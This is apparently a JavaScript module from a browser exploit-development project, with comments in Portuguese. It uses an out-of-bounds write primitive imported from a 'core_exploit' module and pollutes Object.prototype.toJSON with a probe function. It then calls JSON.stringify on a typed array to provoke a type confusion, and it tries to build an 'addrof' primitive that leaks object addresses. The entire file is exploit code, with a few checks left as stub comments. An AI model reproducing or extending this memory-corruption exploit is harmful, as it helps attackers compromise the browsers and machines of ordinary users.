// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v20_TargetProbeReturn)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TPR = "OriginalHeisenbug_TypedArrayAddrof_v20_TargetProbeReturn";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let latest_known_probe_details_v20 = null; 
let object_to_leak_A_v20 = null;
let object_to_leak_B_v20 = null;
let victim_typed_array_ref_v20 = null;
let probe_call_count_v20 = 0;
let previous_probe_return_v20 = null; // Armazena o objeto retornado pela sonda anterior

function toJSON_TA_Probe_TargetProbeReturn() {
    probe_call_count_v20++;
    const call_num = probe_call_count_v20;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v20_TargetProbeReturn",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        this_is_victim_ref: false,
        this_is_prev_probe_return: false,
        writes_attempted_on_this: false,
        confused_this_keys_after_write: null
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        current_call_details.this_is_victim_ref = (this === victim_typed_array_ref_v20);
        current_call_details.this_is_prev_probe_return = (call_num > 1 && this === previous_probe_return_v20);

        logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type_in_toJSON}. IsVictim? ${current_call_details.this_is_victim_ref}. IsPrevReturn? ${current_call_details.this_is_prev_probe_return}.`, "leak");

        if (current_call_details.this_is_prev_probe_return && current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON PREVIOUS PROBE RETURN DETECTED! ('this' is prev_probe_return and [object Object])`, "vuln");
            
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Attempting addrof writes on this confused previous_probe_return object...`, "warn");
            if (object_to_leak_A_v20) this[0] = object_to_leak_A_v20;
            if (object_to_leak_B_v20) this[1] = object_to_leak_B_v20;
            current_call_details.writes_attempted_on_this = true;
            try {
                current_call_details.confused_this_keys_after_write = Object.keys(this);
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Confused 'this' (prev_probe_return) keys after writes: ${current_call_details.confused_this_keys_after_write.join(',')}`, "info");
            } catch (e_keys) { 
                 logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Error getting keys from confused 'this' after write: ${e_keys.message}`, "warn");
            }
        } else if (current_call_details.this_is_victim_ref) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Type: ${current_call_details.this_type_in_toJSON}.`, "info");
        } else if (current_call_details.this_type_in_toJSON === '[object Object]') {
             logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is [object Object] but not prev_probe_return or victim. Writes not specifically targeted.`, "info");
             // Poderíamos ainda tentar escritas aqui se quisermos ser super agressivos, mas vamos focar.
        }
    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
    }
    
    latest_known_probe_details_v20 = current_call_details; 
    
    const marker_to_return = { "probe_marker_v20": call_num, "id": `marker_obj_call_${call_num}` };
    previous_probe_return_v20 = marker_to_return; // Armazena para a próxima chamada checar
    logS3(`[${current_call_details.probe_variant}] Call #${call_num} FINISHING. Global updated. Returning: ${JSON.stringify(marker_to_return)}`, "dev_verbose");
    return marker_to_return; 
}

export async function executeTypedArrayVictimAddrofTest_TargetProbeReturn() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TPR}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TargetProbeReturn) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TPR} Init...`;

    probe_call_count_v20 = 0;
    latest_known_probe_details_v20 = null; 
    victim_typed_array_ref_v20 = null; 
    previous_probe_return_v20 = null;
    object_to_leak_A_v20 = { marker: "ObjA_TA_v20tpr", id: Date.now() }; 
    object_to_leak_B_v20 = { marker: "ObjB_TA_v20tpr", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    let captured_details_of_last_probe_run = null; 
    
    let addrof_victim_A = { success: false, msg: "Addrof victim_buffer[0]: Default" };
    let addrof_victim_B = { success: false, msg: "Addrof victim_buffer[1]: Default" };
    let addrof_output_A = { success: false, msg: "Addrof stringifyOutput[0]: Default" };
    let addrof_output_B = { success: false, msg: "Addrof stringifyOutput[1]: Default" };

    const fillPattern = 0.20202020202020;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v20 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v20.buffer); 
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) float64_view_on_underlying_ab[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v20 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_TargetProbeReturn, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v20); 
            logS3(`  JSON.stringify completed. Stringify Output Object (parsed): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST); // stringifyOutput é um objeto aqui
            
            if (latest_known_probe_details_v20) {
                captured_details_of_last_probe_run = JSON.parse(JSON.stringify(latest_known_probe_details_v20)); 
            }
            logS3(`  EXECUTE: Captured details of LAST probe run: ${captured_details_of_last_probe_run ? JSON.stringify(captured_details_of_last_probe_run) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmed = false;
            if (captured_details_of_last_probe_run && captured_details_of_last_probe_run.this_type_in_toJSON === "[object Object]") {
                heisenbugConfirmed = true;
                logS3(`  EXECUTE: HEISENBUG CONFIRMED (Last Probe 'this' type: [object Object])`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug NOT confirmed by last probe details. Last type: ${captured_details_of_last_probe_run ? captured_details_of_last_probe_run.this_type_in_toJSON : 'N/A'}`, "error", FNAME_CURRENT_TEST);
            }
                
            // 1. Checar buffer da vítima
            logS3("STEP 3: Checking victim_typed_array_ref_v20.buffer...", "warn", FNAME_CURRENT_TEST);
            const val_A_victim = float64_view_on_underlying_ab[0];
            let temp_AV_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A_victim]).buffer)[0], new Uint32Array(new Float64Array([val_A_victim]).buffer)[1]);
            if (val_A_victim !== (fillPattern + 0) && val_A_victim !== 0 && (temp_AV_int64.high() < 0x00020000 || (temp_AV_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_victim_A.success = true; addrof_victim_A.msg = `Possible pointer for ObjA in victim_buffer[0]: ${temp_AV_int64.toString(true)}`;
            } else { addrof_victim_A.msg = `No pointer for ObjA in victim_buffer[0]. Val: ${val_A_victim}`; }
            // ... (similar para B na vítima)

            // 2. Checar stringifyOutput (que é o objeto retornado pela primeira sonda, potencialmente modificado)
            logS3("STEP 4: Checking stringifyOutput (returned by first probe call, possibly modified)...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput && typeof stringifyOutput === 'object') {
                const val_A_output = stringifyOutput[0]; // Checa se a chave "0" foi adicionada
                if (val_A_output !== undefined) { // Se a chave "0" existir
                    let temp_AO_int64 = null;
                    if (typeof val_A_output === 'number') { // Se for um float64 representando um ponteiro
                        temp_AO_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A_output]).buffer)[0], new Uint32Array(new Float64Array([val_A_output]).buffer)[1]);
                        if (val_A_output !== 0 && (temp_AO_int64.high() < 0x00020000 || (temp_AO_int64.high() & 0xFFFF0000) === 0xFFFF0000)) {
                            addrof_output_A.success = true; addrof_output_A.msg = `Possible pointer for ObjA in stringifyOutput[0]: ${temp_AO_int64.toString(true)}`;
                        } else { addrof_output_A.msg = `stringifyOutput[0] is number but not pointer-like: ${val_A_output}`; }
                    } else if (val_A_output === object_to_leak_A_v20) { // Comparação de identidade direta
                         addrof_output_A.success = true; addrof_output_A.msg = `object_to_leak_A_v20 found by identity in stringifyOutput[0].`;
                    } else { addrof_output_A.msg = `stringifyOutput[0] not a pointer or direct match. Type: ${typeof val_A_output}`; }
                } else { addrof_output_A.msg = `Key "0" not found in stringifyOutput.`; }
                // ... (similar para B no stringifyOutput)
                 const val_B_output = stringifyOutput[1];
                if (val_B_output !== undefined) {
                    let temp_BO_int64 = null;
                    if (typeof val_B_output === 'number') {
                        temp_BO_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B_output]).buffer)[0], new Uint32Array(new Float64Array([val_B_output]).buffer)[1]);
                        if (val_B_output !== 0 && (temp_BO_int64.high() < 0x00020000 || (temp_BO_int64.high() & 0xFFFF0000) === 0xFFFF0000)) {
                            addrof_output_B.success = true; addrof_output_B.msg = `Possible pointer for ObjB in stringifyOutput[1]: ${temp_BO_int64.toString(true)}`;
                        } else { addrof_output_B.msg = `stringifyOutput[1] is number but not pointer-like: ${val_B_output}`; }
                    } else if (val_B_output === object_to_leak_B_v20) {
                         addrof_output_B.success = true; addrof_output_B.msg = `object_to_leak_B_v20 found by identity in stringifyOutput[1].`;
                    } else { addrof_output_B.msg = `stringifyOutput[1] not a pointer or direct match. Type: ${typeof val_B_output}`; }
                } else { addrof_output_B.msg = `Key "1" not found in stringifyOutput.`; }

            } else {
                addrof_output_A.msg = "stringifyOutput was not an object or was null.";
                addrof_output_B.msg = "stringifyOutput was not an object or was null.";
            }

            if (addrof_victim_A.success || addrof_victim_B.success || addrof_output_A.success || addrof_output_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TPR}: Addr? SUCESSO!`;
            } else if (heisenbugConfirmed) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TPR}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TPR}: Heisenbug Fail?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TPR}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_TPR} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v20}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: Success=${addrof_victim_A.success}, Msg='${addrof_victim_A.msg}'`, addrof_victim_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim B: Success=${addrof_victim_B.success}, Msg='${addrof_victim_B.msg}'`, addrof_victim_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Output A: Success=${addrof_output_A.success}, Msg='${addrof_output_A.msg}'`, addrof_output_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Output B: Success=${addrof_output_B.success}, Msg='${addrof_output_B.msg}'`, addrof_output_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v20 = null; 
        latest_known_probe_details_v20 = null; 
        probe_call_count_v20 = 0;
        previous_probe_return_v20 = null;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput, // Este é o objeto retornado pela Call #1 da sonda, potencialmente modificado
        toJSON_details: captured_details_of_last_probe_run, // Detalhes da última chamada da sonda (Call #2 ou #3)
        total_probe_calls: probe_call_count_v20,
        addrof_victim_A: addrof_victim_A,
        addrof_victim_B: addrof_victim_B,
        addrof_output_A: addrof_output_A,
        addrof_output_B: addrof_output_B
    };
}
